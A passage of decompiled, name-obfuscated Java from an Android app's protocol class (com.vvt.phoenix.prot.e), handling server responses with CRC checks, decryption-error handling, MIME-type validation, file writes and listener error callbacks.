        tmp586_579[5] = 0;
        tmp586_579[6] = 0;
        tmp586_579[7] = 0;
        ((ByteArrayInputStream)localObject4).read((byte[])localObject5, i, i);
        l3 = com.vvt.phoenix.a.a.c((byte[])localObject5);
        n = localObject2.length + -4;
        localObject2 = new byte[n];
        i = localObject2.length;
        ((ByteArrayInputStream)localObject4).read((byte[])localObject2, 0, i);
        com.vvt.io.d.a((InputStream)localObject4);
        l2 = com.vvt.k.a.a((byte[])localObject2);
        bool1 = l2 < l3;
        if (!bool1) {
          break label950;
        }
        localObject2 = g.f(this.c);
        if (localObject2 != null)
        {
          localObject2 = this.a;
          localObject4 = g.f(this.c);
          localObject5 = new Object[k];
          long l4 = g.b(this.c);
          localObject6 = Long.valueOf(l4);
          localObject5[0] = localObject6;
          localObject6 = new java/lang/Exception;
          localObject7 = "CRC Value is invalid";
          ((Exception)localObject6).<init>((String)localObject7);
          localObject5[j] = localObject6;
          c.u((c)localObject2, localObject4, k, (Object[])localObject5);
        }
        c();
      }
      catch (GeneralSecurityException localGeneralSecurityException)
      {
        localObject4 = g.f(this.c);
        if (localObject4 != null)
        {
          localObject4 = this.a;
          localObject5 = g.f(this.c);
          localObject6 = new Object[k];
          l2 = g.b(this.c);
          localObject7 = Long.valueOf(l2);
          localObject6[0] = localObject7;
          localObject6[j] = localGeneralSecurityException;
          c.s((c)localObject4, localObject5, k, (Object[])localObject6);
        }
        c();
      }
      catch (IllegalArgumentException localIllegalArgumentException)
      {
        localObject4 = g.f(this.c);
        if (localObject4 != null)
        {
          localObject4 = this.a;
          localObject5 = g.f(this.c);
          localObject6 = new Object[k];
          l2 = g.b(this.c);
          localObject7 = Long.valueOf(l2);
          localObject6[0] = localObject7;
          localObject7 = new java/lang/IllegalArgumentException;
          String str = "IllegalArgumentException while decrypt response data";
          ((IllegalArgumentException)localObject7).<init>(str, localIllegalArgumentException);
          localObject6[j] = localObject7;
          c.t((c)localObject4, localObject5, k, (Object[])localObject6);
        }
        c();
      }
      continue;
      label950:
      boolean bool1 = false;
      localObject4 = null;
      try
      {
        localObject4 = com.vvt.phoenix.prot.a.f.a(localIllegalArgumentException, false);
        Object localObject3 = this.c;
        l3 = g.b((g)localObject3);
        ((s)localObject4).b(l3);
        boolean bool3 = localObject4 instanceof u;
        if (bool3)
        {
          Object localObject8 = localObject4;
          localObject8 = (u)localObject4;
          localObject3 = localObject8;
          localObject5 = this.a;
          localObject5 = c.b((c)localObject5);
          ((u)localObject8).a((com.vvt.phoenix.prot.c.b)localObject5);
        }
        a((s)localObject4);
      }
      catch (IOException localIOException2)
      {
        localObject4 = g.f(this.c);
      }
      if (localObject4 != null)
      {
        localObject4 = this.a;
        localObject5 = g.f(this.c);
        localObject6 = new Object[k];
        l2 = g.b(this.c);
        localObject7 = Long.valueOf(l2);
        localObject6[0] = localObject7;
        localObject6[j] = localIOException2;
        c.v((c)localObject4, localObject5, k, (Object[])localObject6);
      }
    }
  }
  
  public long a()
  {
    return g.b(this.c);
  }
  
  public void a(int paramInt, Exception paramException)
  {
    int i = 1;
    int j = 2;
    com.vvt.io.d.a(g.k(this.c));
    Object localObject1 = g.f(this.c);
    if (localObject1 != null)
    {
      localObject1 = this.a;
      a locala = g.f(this.c);
      Object[] arrayOfObject1 = new Object[j];
      long l = g.b(this.c);
      Object localObject2 = Long.valueOf(l);
      arrayOfObject1[0] = localObject2;
      localObject2 = new java/lang/Exception;
      Object[] arrayOfObject2 = new Object[j];
      Object localObject3 = Integer.valueOf(paramInt);
      arrayOfObject2[0] = localObject3;
      localObject3 = paramException.toString();
      arrayOfObject2[i] = localObject3;
      String str = String.format("HTTP %d, %s", arrayOfObject2);
      ((Exception)localObject2).<init>(str, paramException);
      arrayOfObject1[i] = localObject2;
      c.m((c)localObject1, locala, j, arrayOfObject1);
    }
    c();
  }
  
  public void a(com.vvt.http.a.a parama)
  {
    int i = 2;
    int j = 1;
    Object localObject1 = parama.d();
    Object localObject2 = this.c;
    boolean bool = g.j((g)localObject2);
    if (bool) {}
    for (;;)
    {
      try
      {
        localObject2 = this.c;
        localObject2 = g.k((g)localObject2);
        if (localObject2 == null)
        {
          localObject2 = this.c;
          localObject3 = new java/io/FileOutputStream;
          localObject4 = this.c;
          localObject4 = g.l((g)localObject4);
          ((FileOutputStream)localObject3).<init>((String)localObject4);
          g.a((g)localObject2, (OutputStream)localObject3);
          bool = false;
          localObject2 = null;
          int k = localObject1[0];
          if (k == j)
          {
            localObject2 = this.c;
            int m = 1;
            g.c((g)localObject2, m);
            k = localObject1.length;
            if (k > j)
            {
              localObject2 = this.c;
              localObject2 = g.k((g)localObject2);
              localObject2 = (FileOutputStream)localObject2;
              m = 1;
              i1 = localObject1.length + -1;
              ((FileOutputStream)localObject2).write((byte[])localObject1, m, i1);
            }
          }
          return;
        }
      }
      catch (IOException localIOException)
      {
        int i1;
        localObject1 = g.f(this.c);
        if (localObject1 == null) {
          continue;
        }
        localObject1 = this.a;
        Object localObject3 = g.f(this.c);
        Object localObject4 = new Object[i];
        long l = g.b(this.c);
        Long localLong = Long.valueOf(l);
        localObject4[0] = localLong;
        localObject4[j] = localIOException;
        c.n((c)localObject1, localObject3, i, (Object[])localObject4);
        c();
        continue;
      }
      localObject2 = this.c;
      localObject2 = g.k((g)localObject2);
      localObject2 = (FileOutputStream)localObject2;
      int n = 0;
      localObject3 = null;
      i1 = localObject1.length;
      ((FileOutputStream)localObject2).write((byte[])localObject1, 0, i1);
      continue;
      ByteArrayOutputStream localByteArrayOutputStream = (ByteArrayOutputStream)g.k(this.c);
      n = localObject1.length;
      localByteArrayOutputStream.write((byte[])localObject1, 0, n);
    }
  }
  
  public void a(com.vvt.http.a.b paramb) {}
  
  public void a(a parama)
  {
    if (parama != null) {}
    try
    {
      localObject = this.a;
      c.a((c)localObject, parama);
    }
    catch (NullListenerException localNullListenerException)
    {
      Object localObject;
      int i;
      for (;;) {}
    }
    localObject = this.c;
    i = g.a((g)localObject);
    if (i == 0)
    {
      i = 1;
      a(i);
    }
  }
  
  public void a(Exception paramException)
  {
    int i = 2;
    com.vvt.io.d.a(g.k(this.c));
    Object localObject = g.f(this.c);
    if (localObject != null)
    {
      localObject = this.a;
      a locala = g.f(this.c);
      Object[] arrayOfObject = new Object[i];
      long l = g.b(this.c);
      Long localLong = Long.valueOf(l);
      arrayOfObject[0] = localLong;
      int j = 1;
      arrayOfObject[j] = paramException;
      c.k((c)localObject, locala, i, arrayOfObject);
    }
    c();
  }
  
  public void b()
  {
    g.a(this.c, null);
  }
  
  public void b(com.vvt.http.a.a parama)
  {
    int i = 2;
    com.vvt.io.d.a(g.k(this.c));
    Object localObject1 = parama.a().d();
    Object localObject2 = parama.b();
    if (localObject1 != localObject2)
    {
      localObject1 = g.f(this.c);
      if (localObject1 != null)
      {
        localObject1 = this.a;
        localObject2 = g.f(this.c);
        Object[] arrayOfObject = new Object[i];
        long l = g.b(this.c);
        Object localObject3 = Long.valueOf(l);
        arrayOfObject[0] = localObject3;
        int j = 1;
        localObject3 = new java/lang/Exception;
        String str = "Incorrect MIME type.";
        ((Exception)localObject3).<init>(str);
        arrayOfObject[j] = localObject3;
        c.o((c)localObject1, localObject2, i, arrayOfObject);
      }
      c();
    }
    for (;;)
    {
      return;
      j();
    }
  }
  
  public void b(Exception paramException)
  {
    int i = 2;
    com.vvt.io.d.a(g.k(this.c));
    Object localObject = g.f(this.c);
    if (localObject != null)
    {
      localObject = this.a;
      a locala = g.f(this.c);
      Object[] arrayOfObject = new Object[i];
      long l = g.b(this.c);
      Long localLong = Long.valueOf(l);
      arrayOfObject[0] = localLong;
      int j = 1;
      arrayOfObject[j] = paramException;
      c.l((c)localObject, locala, i, arrayOfObject);
    }
    c();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */